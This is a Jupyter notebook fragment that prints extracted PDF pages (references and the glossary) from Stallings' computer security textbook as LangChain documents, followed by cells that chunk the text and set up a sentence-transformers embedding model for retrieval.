       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 974, 'page_label': 'J-17'}, page_content='J.5 / RECOMMENDED READING AND REFERENCES  J-17\\n J.5  RECOMMENDED READING AND REFERENCES\\n[CRUZ11] provides background on the development of SHA-3 and an overview \\nof the five finalists. [PREN10] provides a good background on the cryptographic \\ndevelopments that led to the need for a new has algorithm. [BURR08] discusses the \\nrationale for the new hash standard and NIST’s strategy for developing it.\\nBURR08 Burr , W. “A New Hash Competition.” IEEE Security & Privacy, May–June, \\n2008.\\nCRUZ11\\n Cruz,\\n J. “Finding the New Encryption Standard, SHA-3.” Dr. Dobb’s, October 3,  \\n2011. http://www.drdobbs.com/security/finding-the-new-encryption-standard-sha-/  \\n231700137\\nPREN10\\n Pr\\neneel, B. “The First 30 Years of Cryptographic Hash Functions and the NIST \\nSHA-3 Competition.” CT-RSA’10 Proceedings of the 2010 international conference on \\nTopics in Cryptology, 2010.\\nBERT07 Bertoni,  G., et al. “Sponge Functions.” Ecrypt Hash Workshop 2007, May 2007 .\\nBERT11\\n B\\nertoni, G., et al. “Cryptographic Sponge Functions.” January 2011, http://sponge \\n.noekeon.org/.\\nWANG05\\n W\\nang, X.; Yin, Y.; and Yu, H. “Finding Collisions in the Full SHA-1. Proceed-\\nings, Crypto ’05, 2005; published by Springer-Verlag.\\nReferences\\nZ13_STAL0611_04_GE_APPJ.indd   17 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 975, 'page_label': 'K-1'}, page_content='K-1\\nAPPENDIX K\\nGlossAry\\naccess control T he process of granting or denying specific requests: (1) for obtaining \\nand using  information \\nand related information processing services; and (2) to \\nenter specific physical facilities.\\naccess control list (ACL)\\n A discr\\netionary access control technique organized by \\nobject. For\\xa0each object, an ACL lists users and their permitted access rights.\\naccess matrix\\n A matrix whose two dimensions ar\\ne subjects and objects. Each cell in \\nthe matrix lists the access permissions of that subject for that object.\\naccess right\\n Describes the wa\\ny in which a subject may access an object.\\nactive attack\\n An at\\ntempt to alter system resources or affect their operation.\\nadversary\\n An entity that at\\ntacks, or is a threat to, a system.\\nanomaly detection\\n In\\nvolves the collection of data relating to the behavior of legiti-\\nmate users over a period of time. Then, statistical tests are applied to observed \\nbehavior to determine with a high level of confidence whether that behavior is \\nnot legitimate user behavior.\\nasset\\n Anything that needs to be pr\\notected because it has value to the organization, \\nboth tangible and intangible, including computer and communications hard-\\nware infrastructure, software (including applications and information/data held \\non these systems), the documentation on these systems, and the people who \\nmanage and maintain these systems.\\nassurance\\n T\\nhe degree of confidence one has that the security measures, both techni-\\ncal and operational, work as intended to protect the system and the information \\nit processes.\\nasymmetric encryption\\n A form of cryptosystem in which encryption and decryp\\n-\\ntion are \\n performed using two dif\\nferent keys, one of which is referred to as the \\npublic key and one of which is referred to as the private key. Also known as \\npublic-key encryption.\\nattack\\n A thr\\neat that is carried out (threat action) and, if successful, leads to an \\nundesirable violation of security.\\naudit\\n Independent r\\neview and examination of records and activities to assess the \\nadequacy of system controls, to ensure compliance with established policies \\nand operational \\n pr\\nocedures, and to recommend necessary changes in controls, \\npolicies, or procedures.\\nauthentication\\n V\\nerifying the identity of a user, process, or device, often as a prereq-\\nuisite to allowing access to resources in an information system.\\nauthenticator\\n A\\ndditional information appended to a message to enable the receiver \\nto verify that the message should be accepted as authentic. The authentica-\\ntor may be functionally independent of the content of the message itself  \\nZ14_STAL0611_04_GE_APPK.indd   1 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 976, 'page_label': 'K-2'}, page_content='K-2  APPENDIX K\\n(e.g., a nonce or a source identifier) or it may be a function of the message \\ncontents (e.g., a hash value or a cryptographic checksum).\\nauthenticity\\n T\\nhe property of being genuine and being able to be verified and trusted; \\nconfidence in the validity of a transmission, a message, or message originator.\\navailability\\n T\\nhe property of a system or a system resource being accessible and \\nusable upon demand by an authorized system entity, according to performance \\nspecifications for the system; that is, a system is available if it provides services \\naccording to the system design whenever users request them.\\nbackdoor\\n Any mechanisms that bypasses a normal security check;\\n it may allow \\nunauthorized access to functionality.\\nbacteria\\n Pr\\nogram that consumes system resources by replicating itself.\\nbase-rate fallacy\\n Occurs when ther\\ne is an attempt to detect a phenomenon that \\noccurs rarely. The frequency of occurrence is referred to as the base rate. When \\nthe base rate is very low, it is difficult to achieve low levels of both false \\n positives\\n \\nand false negatives.\\nbiometric\\n A physical or beha\\nvioral characteristic of a human being.\\nblock chaining\\n A pr\\nocedure used during symmetric block encryption that makes \\nan output block dependent not only on the current plaintext input block and \\nkey, but also on \\n earlier input and/or output.\\n The effect of block chaining is that \\ntwo instances of the same plaintext input block will produce different ciphertext \\nblocks, making cryptanalysis more difficult.\\nblock cipher\\n A symmetric encryption algorithm in which a block of plaintext bits \\n(typically 64 or 128) is tr\\nansformed as a whole into a ciphertext block of the \\nsame length.\\nbrute force attack\\n A cryptanalysis technique or other kind of at\\ntack method involv-\\ning an exhaustive procedure that tries all possibilities, one by one.\\nbuffer overflow\\n A condition at an interface under which mor\\ne input can be placed \\ninto a buffer or data holding area than the capacity allocated, overwriting other \\ninformation. Attackers exploit such a condition to crash a system or to insert \\nspecially crafted code that allows them to gain control of the system.\\ncapability ticket\\n A discr\\netionary access control technique organized by subject. For \\neach subject, the capability ticket lists objects and their permitted access rights \\nby this subject.\\ncertificate authority A\\n trusted entity that issues and revokes public key certificates.\\nchallenge-response\\n An authentication pr\\nocess that verifies an identity by requiring \\ncorrect authentication information to be provided in response to a challenge. \\nIn a computer system, the authentication information is usually a value that is \\nrequired to be computed in response to an unpredictable challenge value.\\ncipher\\n An algorithm for encryption and decryption.\\n A cipher replaces a piece of \\n information (an element in plaintext) with another object,\\n with the intent to \\nconceal meaning.  T\\nypically, the replacement rule is governed by a secret key.\\nciphertext\\n T\\nhe output of an encryption algorithm; the encrypted form of a message \\nor data.\\nclosed access control policy\\n Only accesses that ar\\ne specifically authorized are \\nallowed.\\nZ14_STAL0611_04_GE_APPK.indd   2 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 977, 'page_label': 'K-3'}, page_content='APPENDIX K  K-3\\ncollision resistant  A pr operty of a hash function such that it is computationally \\ninfeasible to find any pair (x, y) such that H(x) = H(y). Also referred to as strong \\ncollision resistant.\\nconfidentiality\\n Pr\\neserving authorized restrictions on information access and \\ndisclosure, including means for protecting personal privacy and proprie-\\ntary information. A loss of confidentiality is the unauthorized disclosure of \\ninformation.\\ncopyright\\n Pr\\notects the tangible or fixed expression of an idea, not the idea itself.\\ncorruption\\n An at\\ntack on system integrity. Malicious software in this context could \\noperate in such a way that system resources or services function in an unin-\\ntended manner. Or a user could gain unauthorized access to a system and \\nmodify some of its functions.\\ncountermeasure\\n A\\nctions, devices, procedures, techniques, or other measures that \\nreduce the vulnerability of an information system. Also known as a control or \\nsafeguard.\\ncovert channel\\n A communications channel that enables the tr\\nansfer of information \\nin a way unintended by the designers of the communications facility.\\ncryptanalysis\\n T\\nhe branch of cryptology dealing with the breaking of a cipher to \\nrecover information, or forging encrypted information that will be accepted \\nas authentic.\\ncryptographic checksum\\n An authenticator that is a cryptogr\\naphic function of both the \\ndata to be authenticated and a secret key. Also referred to as a message authentica-\\ntion code (MAC).\\ncryptography\\n T\\nhe branch of cryptology dealing with the design of algorithms for \\nencryption and decryption, intended to ensure the secrecy and/or authenticity \\nof messages.\\ncryptology\\n T\\nhe study of secure communications, which encompasses both cryptog-\\nraphy and cryptanalysis.\\ndata confidentiality\\n T\\nhe property that information is not made available or dis-\\nclosed to unauthorized individuals, entities, or processes.\\ndata integrity\\n T\\nhe property that data has not been changed, destroyed, or lost in an \\nunauthorized or accidental manner.\\ndatabase\\n A collection of interr\\nelated data, often with controlled redundancy, \\norganized to serve multiple applications. The data are stored so they can be \\nused by different programs without concern for the internal data structure or \\norganization.\\ndatabase management system (DBMS)\\n A suite of pr\\nograms for constructing and \\nmaintaining a database and for offering ad hoc query facilities to multiple users \\nand applications.\\ndecryption T\\nhe translation of encrypted text or data (called ciphertext) into original \\ntext or data (called plaintext). Also called deciphering.\\ndenial of service\\n T\\nhe prevention of authorized access to resources or the delaying \\nof time-critical operations.\\ndigital signature\\n An authentication mechanism that enables the cr\\neator of a mes-\\nsage to attach a code that acts as a signature. The signature is formed by taking \\nZ14_STAL0611_04_GE_APPK.indd   3 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 978, 'page_label': 'K-4'}, page_content='K-4  APPENDIX K\\nthe hash of the message and encrypting the message with the creator’s private \\nkey. The signature guarantees the source and integrity of the message.\\ndiscretionary access control\\n An access contr\\nol service that enforces a security policy \\nbased on the identity of system entities and their authorizations to access sys-\\ntem resources. This service is termed “discretionary” because an entity might \\nhave access rights that permit the entity, by its own volition, to enable another \\nentity to access some resource.\\ndisruption\\n A thr\\neat to availability or system integrity.\\nelliptic curve cryptography\\n A cryptogr\\naphic technique based on the use of a math-\\nematical construct known as the elliptic curve.\\nencryption\\n T\\nhe conversion of plaintext or data into unintelligible form by means of \\na reversible translation, based on a translation table or algorithm. Also called \\nenciphering.\\nevaluation\\n T\\nhe process of examining a computer product or system with respect \\nto certain criteria.\\nexposure\\n Can be deliber\\nate, as when an insider intentionally releases sensitive \\ninformation, such as credit card numbers, to an outsider. It can also be the \\nresult of a human, hardware, or software error, which results in an entity gaining \\nunauthorized knowledge of sensitive data.\\nfalse positive\\n In the context of intrusion detection,\\n an authorized user identified \\nas an intruder.\\nfalse negative In the contex\\nt of intrusion detection, intruders identified as an autho-\\nrized user.\\nfalsification\\n T\\nhe altering or replacing of valid data or the introduction of false data \\ninto a file or database.\\nfirewall\\n One or mor\\ne dedicated computer systems or devices inserted between a \\npremises network and the Internet (or other external network), to establish a \\ncontrolled link and to erect an outer security wall or perimeter. These systems \\nare secured and provide security mechanisms designed to protect computers \\nand data within the network from Internet-based attacks, and to provide a \\nsingle choke point where such security and auditing can be imposed.\\nhash function\\n A function that maps a v\\nariable-length data block or message into \\na fixed-length value called a hash code. The function is designed in such a way \\nthat, when protected, it provides an authenticator to the data or message. Also \\nreferred to as a message digest or one-way hash function.\\nhashed password\\n A hash v\\nalue of a password stored in place of the password in a \\npassword file.\\nhoneypot\\n A decoy system designed to lur\\ne a potential attacker away from critical \\nsystems. A form of intrusion detection.\\nidentification\\n T\\nhe means by which a user provides a claimed identity to the system.\\nidentity management\\n A centr\\nalized, automated approach to provide enterprise-\\nwide access to resources by employees and other authorized individuals.\\nincapacitation\\n An at\\ntack on system availability. This could occur as a result of physi-\\ncal destruction of or damage to system hardware. More typically, malicious \\nZ14_STAL0611_04_GE_APPK.indd   4 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 979, 'page_label': 'K-5'}, page_content='APPENDIX K  K-5\\nsoftware, such as Trojan horses, viruses, or worms, could operate in such a way \\nas to disable a system or some of its services.\\ninference\\n A th\\nreat action whereby an unauthorized entity indirectly accesses sensi-\\ntive data by reasoning from characteristics or byproducts of data to which the \\nentity does have access.\\ninline sensor\\n An intrusion detection sensor inserted into a network segment so the \\ntr\\naffic that it is monitoring must pass through the sensor.\\ninside attack\\n An at\\ntack initiated by an entity inside the security perimeter (an \\n“insider”). The insider is authorized to access system resources but uses them \\nin a way not approved by those who granted the authorization.\\nintegrity\\n A term that covers the r\\nelated concepts of data integrity and system \\nintegrity.\\ninterception\\n A thr\\neat action whereby an unauthorized entity directly accesses sensi-\\ntive data traveling between authorized sources and destinations.\\nintruder\\n An individual who gains\\n, or attempts to gain, unauthorized access to a \\ncomputer system or to gain unauthorized privileges on that system.\\nintrusion\\n A security event,\\n or a combination of multiple security events, that consti-\\ntutes a security incident in which an intruder gains, or attempts to gain, access \\nto a system (or system resource) without having authorization to do so.\\nintrusion detection system\\n A set of automated tools designed to detect unauthor-\\nized access to a host system.\\nintrusion pr\\nevention system\\n A set of automated tools designed to pr\\nevent unau-\\nthorized access to a host system.\\nkey distribution center\\n A system that is authorized to tr\\nansmit temporary session \\nkeys to principals. Each session key is transmitted in encrypted form, using a \\nmaster key that the key distribution center shares with the target principal.\\nkey exchange\\n A \\nprocedure whereby two communicating parties can cooperate to \\nacquire a shared secret key.\\nleast privilege\\n T\\nhis is the principle that access control should be implemented so \\neach system entity is granted the minimum system resources and authoriza-\\ntions that the entity needs to do its work. This principle tends to limit damage \\nthat can be caused by an accident, error, or fraudulent or unauthorized act.\\nlogic bomb\\n Logic embedded in a computer pr\\nogram that checks for a certain set \\nof conditions to be present on the system. When these conditions are met, it \\nexecutes some function resulting in unauthorized actions.\\nlogical security\\n Pr\\notects computer-based data from software-based and communi-\\ncation-based threats.\\nmalicious software\\n Softwar\\ne that exploits vulnerabilities in computing system to \\ncreate an attack. Also called malware.\\nmandatory access control\\n A means of r\\nestricting access to objects based on fixed \\nsecurity attributes assigned to users and to files and other objects. The controls are \\nmandatory in the sense that they cannot be modified by users or their programs.\\nmasquerade\\n A type of at\\ntack in which one system entity illegitimately poses as \\n(assumes the identity of) another entity.\\nZ14_STAL0611_04_GE_APPK.indd   5 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 980, 'page_label': 'K-6'}, page_content='K-6  APPENDIX K\\nmaster key A long-lasting k ey that is used between a key distribution center and a \\nprincipal for the purpose of encoding the transmission of session keys. Typically, \\nthe master keys are distributed by noncryptographic means. Also referred to as \\na key-encrypting key.\\nmemory card\\n A plastic car\\nd that can store but not process data. The most common \\nsuch card is the bank card with a magnetic stripe on the back.\\nmessage authentication\\n A pr\\nocess used to verify the integrity of a message.\\nmessage authentication code (MAC)\\n An authenticator that is a cryptogr\\naphic func-\\ntion of both the data to be authenticated and a secret key. Also referred to as a \\ncryptographic checksum.\\nmessage digest\\n See \\nhash function.\\nmisappropriation\\n A thr\\neat action whereby an entity assumes unauthorized logical \\nor physical control of a system resource.\\nmisuse\\n A \\nthreat action that causes a system component to perform a function or \\nservice that is detrimental to system security.\\nmode of operation\\n A technique for enhancing the ef\\nfect of a cryptographic algo-\\nrithm or adapting the algorithm for an application, such as applying a block \\ncipher to a sequence of data blocks or a data stream.\\nmultilevel security\\n A capability that enfor\\nces access control across multiple levels \\nof \\n classification of data.\\nnon-r\\nepudiation\\n Assur\\nance that the sender of information is provided with proof \\nof delivery and the recipient is provided with proof of the sender’s identity, so \\nneither can later deny having processed the information.\\nobject\\n In the context of access contr\\nol, a resource to which access is controlled.\\nobstruction\\n A\\n threat action that interrupts delivery of system services by hindering \\nsystem operations.\\none-way hash function\\n Same as secur\\ne hash function.\\none-way function\\n A function that is easily computed,\\n but the calculation of its \\ninverse is infeasible.\\nOSI security architecture\\n A management-oriented security standar\\nd that focuses \\non the OSI model and on networking and communications aspects of security.\\noutside attack\\n An at\\ntack initiated by an entity outside the security perimeter (an \\n“outsider”).\\npassive attack\\n An at\\ntempt to learn or make use of information from the system that \\ndoes not affect system resources.\\npassive sensor\\n An intr\\nusion detection sensor that monitors a copy of network \\n tr\\naffic; the actual traffic does not pass through the device.\\npassword\\n A secr\\net data value, usually a character string, that is used as authentica-\\ntion information. A password is usually matched with a user identifier that is \\nexplicitly presented in the authentication process, but in some cases the identity \\nmay be implicit.\\npatent\\n T\\nhe grant of a property right to the inventor of an invention.\\npermission\\n Same as \\naccess right.\\nZ14_STAL0611_04_GE_APPK.indd   6 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 981, 'page_label': 'K-7'}, page_content='APPENDIX K  K-7\\nphysical security Pr otects the information systems that house data and the people \\nwho use, operate, and maintain the systems. Physical security also must prevent \\nany type of physical access or intrusion that can compromise logical security. Also \\ncalled \\n infr\\nastructure security.\\nplaintext\\n T\\nhe input to an encryption function or the output of a decryption function.\\npreimage resistant\\n A pr\\noperty of a hash function such that for any given code h, it \\nis \\n computationally infeasible to find \\nx such that H(x) = h.\\npremises security Pr otects the people and property within an entire area, facility, \\nor building(s), and is usually required by laws, regulations, and fiduciary obliga-\\ntions. Premises security provides perimeter security, access control, smoke and \\nfire detection, fire suppression, some environmental protection, and usually \\nsurveillance systems, alarms, and guards.\\nprivacy\\n Assur\\nes that individuals control or influence what information related to \\nthem may be collected and stored and by whom and to whom that information \\nmay be disclosed.\\nprivate key\\n One \\nof the two keys used in an asymmetric encryption system. For \\nsecure communication, the private key should only be known to its creator.\\npseudorandom number generator\\n A function that deterministically pr\\noduces a \\nsequence of numbers that are apparently statistically random.\\npublic key\\n One of the two k\\neys used in an asymmetric encryption system. The public \\nkey is made public, to be used in conjunction with a corresponding private key.\\npublic-key certificate\\n Consists of a public k\\ney plus a User ID of the key owner, \\nwith the whole block signed by a trusted third party. Typically, the third party \\nis a certificate authority (CA) that is trusted by the user community, such as a \\ngovernment agency or a financial institution.\\npublic-key encryption\\n See \\nasymmetric encryption.\\npublic-key infrastructure (PKI)\\n T\\nhe set of hardware, software, people, policies, and \\nprocedures needed to create, manage, store, distribute, and revoke digital cer-\\ntificates based on asymmetric cryptography.\\nquery language\\n Pr\\novides a uniform interface to the database for users and \\napplications.\\nrelational database\\n A database or\\nganized as a set of tables (relations). A table is a \\ncollection of rows or records and each row in a table contains the same fields. \\nCertain fields may be designated as keys, which means that searches for specific \\nvalues of that field will use indexing to speed them up. Keys also provide a way \\nof linking one table to another.\\nreplay\\n An at\\ntack in which a service already authorized and completed is forged by \\nanother, duplicate request in an attempt to repeat authorized commands.\\nrepudiation\\n Denial by one of the entities in\\nvolved in a communication of having \\nparticipated in all or part of the communication.\\nrisk\\n An expectation of loss expr\\nessed as the probability that a particular threat will \\nexploit a particular vulnerability with a particular harmful result.\\nrole-based access control\\n Contr\\nols access based on the roles that users have within \\nthe system and on rules stating what accesses are allowed to users in given roles.\\nZ14_STAL0611_04_GE_APPK.indd   7 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 982, 'page_label': 'K-8'}, page_content='K-8  APPENDIX K\\nrootkit Set of hack er tools used after an attacker has broken into a computer system \\nand gained root-level access.\\nsalt\\n A r\\nandom value that is concatenated with a password before applying the \\n one-wa\\ny encryption function used to protect passwords that are stored in the \\ndatabase of an access control system.\\nsecond preimage resistant\\n A pr\\noperty of a hash function such that for any given \\nblock x, it is computationally infeasible to find y /uni2260.alt1x with H(y) = H(x). Also \\nreferred to as weak collision resistant.\\nsecret key  T\\nhe key used in a symmetric encryption system. Both participants \\nmust share the same key, and this key must remain secret to protect the \\ncommunication.\\nsecure hash function\\n A hash function with certain additional security pr\\noperties to \\nmake it suitable for use as a primitive in various information security applica-\\ntions, such as authentication and message integrity.\\nsecurity attack\\n See \\nattack.\\nsecurity audit\\n An independent r\\neview and examination of a system’s records and \\nactivities to determine the adequacy of system controls, ensure compliance with \\nestablished security policy and procedures, detect breaches in security services, \\nand recommend any changes that are indicated for countermeasures. The basic \\naudit objective is to establish accountability for system entities that initiate or \\nparticipate in security-relevant events and actions. Thus, means are needed to \\ngenerate and record a security audit trail and to review and analyze the audit \\ntrail to discover and investigate attacks and security compromises.\\nsecurity audit trail\\n A chr\\nonological record of system activities that is sufficient to \\nenable the reconstruction and examination of the sequence of environments \\nand activities \\n surr\\nounding or leading to an operation, procedure, or event in a \\nsecurity-relevant transaction from inception to final results. Also known as a \\nsecurity log.\\nsecurity mechanism\\n A mechanism that is designed to detect,\\n prevent, or recover \\nfrom a security attack.\\nsecurity policy\\n A set of rules and pr\\nactices that specify or regulate how a system or \\norganization provides security services to protect sensitive and critical system \\nresources.\\nsecurity service\\n A \\nservice that enhances the security of the data processing \\nsystems and the information transfers of an organization. The services are \\nintended to counter security attacks, and they make use of one or more \\nsecurity mechanisms to provide the service.\\nseparation of duty T\\nhe practice of dividing the steps in a system function among dif-\\nferent individuals, so as to keep a single individual from subverting the process.\\nsession key\\n A tempor\\nary encryption key used between two principals.\\nsignature detection\\n In\\nvolves an attempt to define a set of rules or attack patterns \\nthat can be used to decide that a given behavior is that of an intruder.\\nsmart card\\n A plastic car\\nd that can store and process data.\\nZ14_STAL0611_04_GE_APPK.indd   8 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 983, 'page_label': 'K-9'}, page_content='APPENDIX K  K-9\\nstatic biometric A biometric that is captur ed without a time component, such as a \\nfingerprint, retina, or face.\\nstatistical database\\n A \\ndatabase that provides data of a statistical nature, such as \\ncounts and averages.\\nstream cipher\\n A symmetric encryption algorithm in which ciphertext output is\\n \\n pr\\noduced bit-by-bit or byte-by-byte from a stream of plaintext input.\\nsubject\\n In the context of access contr\\nol, an entity capable of accessing objects.\\nsymmetric encryption\\n A form of cryptosystem in which encryption and decryption \\nar\\ne \\n performed using the same k\\ney. Also known as conventional encryption.\\nsystem integrity\\n Assur\\nes that a system performs its intended function in an unim-\\npaired \\n manner\\n, free from deliberate or inadvertent unauthorized manipulation \\nof the system.\\nsystem resource\\n See \\nasset.\\nthreat\\n A potential security harm to an asset.\\nt\\noken\\n An item possessed by an individual and used for authentication.\\n Examples \\ninclude electronic keycards, smart cards, and physical keys.\\ntrademark\\n A wor\\nd, name, symbol, or device that is used in trade with goods to indi-\\ncate the source of the goods and to distinguish them from the goods of others.\\ntraffic analysis\\n Infer\\nence of information from observable characteristics of data \\nflow(s), even when the data is encrypted or otherwise not directly available. \\nSuch characteristics include the identities and locations of the source(s) and \\ndestination(s), and the presence, amount, frequency, and duration of occurrence.\\nTrojan horse\\n A computer pr\\nogram that appears to have a useful function, but also \\nhas a hidden and potentially malicious function that evades security mecha-\\nnisms, sometimes by exploiting legitimate authorizations of a system entity that \\ninvokes the program.\\ntrusted system\\n A computer and oper\\nating system that can be verified to implement \\na given security policy.\\nunauthorized disclosure\\n An event in\\nvolving the exposure of information to entities \\nnot authorized access to the information.\\nuser authentication\\n T\\nhe process of verifying an identity claimed by or for a system \\nentity.\\nusurpation: A ci\\nrcumstance or event that results in control of system services or \\nfunctions by an unauthorized entity.\\nverification\\n Pr\\nesenting or generating authentication information that corroborates \\nthe \\n binding between an entity and an identifier\\n.\\nvirtual private network\\n Consists of a set of computers that inter\\nconnect by means \\nof a relatively unsecure network and that make use of encryption and special \\nprotocols to \\n pr\\novide security.\\nvirus\\n Code embedded within a pr\\nogram that causes a copy of itself to be inserted \\nin one or more other programs. In addition to propagation, the virus usually \\nperforms some unwanted function.\\nZ14_STAL0611_04_GE_APPK.indd   9 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 984, 'page_label': 'K-10'}, page_content='K-10  APPENDIX K\\nvulnerability  W eakness in an information system, system security procedures, \\n internal \\n contr\\nols, or implementation that could be exploited or triggered by a \\nthreat source.\\nworm\\n Pr\\nogram that can replicate itself and send copies from computer to  computer\\n \\nacross network connections. Upon arrival, the worm may be activated to \\n r\\neplicate and propagate again. In addition to propagation, the worm usually \\nperforms some unwanted function.\\nzombie\\n A pr\\nogram that secretly takes over another Internet-attached computer \\nand then uses that computer to launch attacks that are difficult to trace to the \\nzombie’s creator.\\nZ14_STAL0611_04_GE_APPK.indd   10 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 985, 'page_label': 'Back Cover'}, page_content='')]"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "a1f4ff5a",
   "metadata": {},
   "outputs": [],
   "source": [
    "def text_split(extracted_data):\n",
    "    text_splitter = RecursiveCharacterTextSplitter(chunk_size=500, chunk_overlap=20)\n",
    "    text_chunks = text_splitter.split_documents(extracted_data)\n",
    "    return text_chunks"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "4ff4efb2",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "6064 is the length of the document\n"
     ]
    }
   ],
   "source": [
    "text_chunks = text_split(extracted_data=data)\n",
    "print(f\"{len(text_chunks)} is the length of the document\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "5b3687f6",
   "metadata": {},
   "outputs": [],
   "source": [
    "def download_hugging_face_embedding_model():\n",
    "    embeddings = HuggingFaceEmbeddings(model_name=\"sentence-transformers/all-MiniLM-L6-v2\", model_kwargs={'device':'cpu'})\n",
    "    return embeddings"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "a49d9357",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/tmp/ipykernel_22186/2935027023.py:2: LangChainDeprecationWarning: The class `HuggingFaceEmbeddings` was deprecated in LangChain 0.2.2 and will be removed in 1.0. An updated version of the class exists in the :class:`~langchain-huggingface package and should be used instead. To use it run `pip install -U :class:`~langchain-huggingface` and import as `from :class:`~langchain_huggingface import HuggingFaceEmbeddings``.\n",
